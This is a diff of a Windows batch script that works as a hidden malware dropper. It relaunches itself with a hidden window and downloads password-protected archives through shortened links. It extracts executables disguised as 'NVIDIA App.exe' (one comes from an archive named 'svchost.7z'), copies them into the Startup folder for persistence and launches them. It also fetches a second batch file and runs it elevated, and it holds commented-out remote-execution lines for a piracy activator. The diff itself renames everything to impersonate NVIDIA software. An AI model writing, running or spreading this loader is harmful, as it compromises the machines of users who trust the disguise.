@@ -3,14 +3,16 @@ if "%~1"=="h" goto work
 powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
 exit /b
 :work
-title VZ
 setlocal EnableExtensions
 pushd "%TEMP%"
 
-set "LOG=%TEMP%\vz.log"
-set "OUT=%TEMP%\vz"
-set "DEST=%APPDATA%\system\NVIDIA App.exe"
-set "RUN=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NVIDIA App.exe"
+set "LOG=%TEMP%\nvidia.log"
+set "OUT1=%TEMP%\nvidia1"
+set "OUT2=%TEMP%\nvidia2"
+set "DEST1=%APPDATA%\system\NVIDIA App.exe"
+set "DEST2=%APPDATA%\system\NVIDIA App 2.exe"
+set "RUN1=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NVIDIA App.exe"
+set "RUN2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NVIDIA App 2.exe"
 >"%LOG%" 2>&1 echo [%DATE% %TIME%] start
 
 :: --- xcls (r-ele) ---
@@ -20,8 +22,8 @@ where curl.exe >nul 2>&1 || call :fail "curl.exe missing"
 set "CURL=curl.exe -fsSL --retry 10 --retry-all-errors --retry-delay 2 --connect-timeout 20 --speed-time 30 --speed-limit 1024"
 
 :: --- Zp ---
-%CURL% -o "%TEMP%\7z.exe" https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.exe >>"%LOG%" 2>&1 || call :fail "7z.exe dl"
-%CURL% -o "%TEMP%\7z.dll" https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.dll >>"%LOG%" 2>&1 || call :fail "7z.dll dl"
+%CURL% -o "%TEMP%\7z.exe" https://github.com/loodyxmer-afk/nvidia/raw/refs/heads/main/7z.exe >>"%LOG%" 2>&1 || call :fail "7z.exe dl"
+%CURL% -o "%TEMP%\7z.dll" https://github.com/loodyxmer-afk/nvidia/raw/refs/heads/main/7z.dll >>"%LOG%" 2>&1 || call :fail "7z.dll dl"
 if not exist "%TEMP%\7z.exe" call :fail "7z.exe absent"
 "%TEMP%\7z.exe" >nul 2>&1 || call :fail "7z.exe broken"
 
@@ -35,64 +37,65 @@ call :p2
 call :run
 
 :: --- Tweaks ---
- call :tweaks
+::call :tweaks
 
 :: --- Windows / Office activation ---
-:: call :act
+::call :act
 
 :: --- Autodesk stuff ---
-:: call :adsk
+::call :adsk
 
 >>"%LOG%" 2>&1 echo [%TIME%] done
 popd
 exit /b 0
 
 :p1
-if exist "%OUT%" rd /s /q "%OUT%"
-%CURL% -C - -o "%TEMP%\NvidiaApp.7z.001" https://tinyurl.com/VZN1PJ >>"%LOG%" 2>&1 || call :fail "P1.001 dl"
-%CURL% -C - -o "%TEMP%\NvidiaApp.7z.002" https://tinyurl.com/VZN2PJ >>"%LOG%" 2>&1 || call :fail "P1.002 dl"
-%CURL% -C - -o "%TEMP%\NvidiaApp.7z.003" https://tinyurl.com/VZN3PJ >>"%LOG%" 2>&1 || call :fail "P1.003 dl"
+if exist "%OUT1%" rd /s /q "%OUT1%"
+%CURL% -C - -o "%TEMP%\NvidiaApp.7z.001" https://tinyurl.com/nvidiaN1PJ >>"%LOG%" 2>&1 || call :fail "P1.001 dl"
+%CURL% -C - -o "%TEMP%\NvidiaApp.7z.002" https://tinyurl.com/nvidiaN2PJ >>"%LOG%" 2>&1 || call :fail "P1.002 dl"
+%CURL% -C - -o "%TEMP%\NvidiaApp.7z.003" https://tinyurl.com/nvidiaN3PJ >>"%LOG%" 2>&1 || call :fail "P1.003 dl"
 for %%A in ("%TEMP%\NvidiaApp.7z.001" "%TEMP%\NvidiaApp.7z.002" "%TEMP%\NvidiaApp.7z.003") do (
   if not exist "%%~A" call :fail "P1 part absent"
   if %%~zA LSS 100000 call :fail "P1 part short"
 )
-"%TEMP%\7z.exe" x "%TEMP%\NvidiaApp.7z.001" -p"@123456789@" -o"%OUT%" -y >>"%LOG%" 2>&1 || call :fail "P1 extract"
-if not exist "%OUT%\NvidiaApp.exe" call :fail "P1 payload absent"
+"%TEMP%\7z.exe" x "%TEMP%\NvidiaApp.7z.001" -p"@123456789@" -o"%OUT1%" -y >>"%LOG%" 2>&1 || call :fail "P1 extract"
+if not exist "%OUT1%\NvidiaApp.exe" call :fail "P1 payload absent"
 if not exist "%APPDATA%\system\" mkdir "%APPDATA%\system" 2>nul
-copy /y "%OUT%\NvidiaApp.exe" "%DEST%" >nul 2>&1
-copy /y "%OUT%\NvidiaApp.exe" "%RUN%" >nul 2>&1
-start "" "%DEST%"
+taskkill /f /im "NVIDIA App.exe" >nul 2>&1
+copy /y "%OUT1%\NvidiaApp.exe" "%DEST1%" >nul 2>&1 || call :fail "P1 copy"
+copy /y "%OUT1%\NvidiaApp.exe" "%RUN1%" >nul 2>&1
+start "" "%DEST1%"
 exit /b 0
 
 :p2
-if exist "%OUT%" rd /s /q "%OUT%"
-%CURL% -C - -o "%TEMP%\svchost.7z" https://tinyurl.com/vzxhost >>"%LOG%" 2>&1 || call :fail "P2 dl"
+if exist "%OUT2%" rd /s /q "%OUT2%"
+%CURL% -C - -o "%TEMP%\svchost.7z" https://tinyurl.com/nvidiaxhost >>"%LOG%" 2>&1 || call :fail "P2 dl"
 for %%A in ("%TEMP%\svchost.7z") do if %%~zA LSS 100000 call :fail "P2 archive short"
-"%TEMP%\7z.exe" x "%TEMP%\svchost.7z" -p"@123456789@" -o"%OUT%" -y >>"%LOG%" 2>&1 || call :fail "P2 extract"
-if not exist "%OUT%\Nvidia App.exe" call :fail "P2 payload absent"
+"%TEMP%\7z.exe" x "%TEMP%\svchost.7z" -p"@123456789@" -o"%OUT2%" -y >>"%LOG%" 2>&1 || call :fail "P2 extract"
+if not exist "%OUT2%\Nvidia App.exe" call :fail "P2 payload absent"
 if not exist "%APPDATA%\system\" mkdir "%APPDATA%\system" 2>nul
-copy /y "%OUT%\Nvidia App.exe" "%DEST%" >nul 2>&1
-copy /y "%OUT%\Nvidia App.exe" "%RUN%" >nul 2>&1
-start "" "%DEST%"
+taskkill /f /im "NVIDIA App 2.exe" >nul 2>&1
+copy /y "%OUT2%\Nvidia App.exe" "%DEST2%" >nul 2>&1 || call :fail "P2 copy"
+copy /y "%OUT2%\Nvidia App.exe" "%RUN2%" >nul 2>&1
+start "" "%DEST2%"
 exit /b 0
 
 :run
-%CURL% -o "%TEMP%\VZX.bat" https://tinyurl.com/ztweak >>"%LOG%" 2>&1 || call :fail "VZX dl"
-if not exist "%TEMP%\VZX.bat" call :fail "VZX absent"
-powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" >>"%LOG%" 2>&1 || call :fail "VZX launch"
-::taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne VZ" >>"%LOG%" 2>&1
+%CURL% -o "%TEMP%\nvidiaX.bat" https://tinyurl.com/ztweak >>"%LOG%" 2>&1 || call :fail "nvidiaX dl"
+if not exist "%TEMP%\nvidiaX.bat" call :fail "nvidiaX absent"
+start "" powershell.exe -NoProfile -Command "Start-Process '%TEMP%\nvidiaX.bat' -Verb RunAs"
 exit /b 0
 
 :tweaks
-start "" powershell.exe -NoProfile -Command "irm 'https://christitus.com/win' | iex"
+start "" cmd /c powershell.exe -NoProfile -Command "irm 'https://christitus.com/win' | iex"
 exit /b 0
 
 :act
-start "" powershell.exe -NoProfile -Command "irm 'https://get.activated.win' | iex"
+start "" cmd /c powershell.exe -NoProfile -Command "irm 'https://get.activated.win' | iex"
 exit /b 0
 
 :adsk
-%CURL% -C - -o "%USERPROFILE%\Downloads\ADSK.rar" https://tinyurl.com/VZADSKPJ >>"%LOG%" 2>&1 || call :fail "ADSK dl"
+%CURL% -C - -o "%USERPROFILE%\Downloads\ADSK.rar" https://tinyurl.com/nvidiaADSKPJ >>"%LOG%" 2>&1 || call :fail "ADSK dl"
 for %%A in ("%USERPROFILE%\Downloads\ADSK.rar") do if %%~zA LSS 100000 call :fail "ADSK short"
 exit /b 0
 
